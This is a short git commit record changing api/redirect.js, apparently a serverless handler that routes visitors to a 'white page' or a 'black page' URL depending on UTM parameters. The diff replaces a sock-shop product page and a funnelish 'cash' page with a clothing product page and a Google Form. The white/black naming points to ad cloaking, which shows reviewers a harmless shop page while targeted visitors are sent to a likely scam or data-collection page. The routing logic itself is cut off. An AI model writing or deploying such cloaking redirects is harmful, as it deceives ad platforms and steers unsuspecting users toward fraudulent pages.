bed6e7623d4f7d8d07f535caa941a3ee527c2524
madison38248 <madison38248@gmail.com>
2025-01-15 13:44:24 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.peoplesocks.com/collections/featured-products/products/everyday-merino-tabsocks";
-    const blackPageURL = "https://VXAJXfDwZd.myfunnelish.com/cash-1735686017557538";
+    const whitePageURL = "https://codevitesse.com/collections/lastcall/products/copy-of-dress-over-pant-tea-pink";
+    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSeaLpaBmTDB_ec_h7QhTvTFkQo_dfDxIj8ghzrPJEEvZ8cJzw/viewform?usp=dialog";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
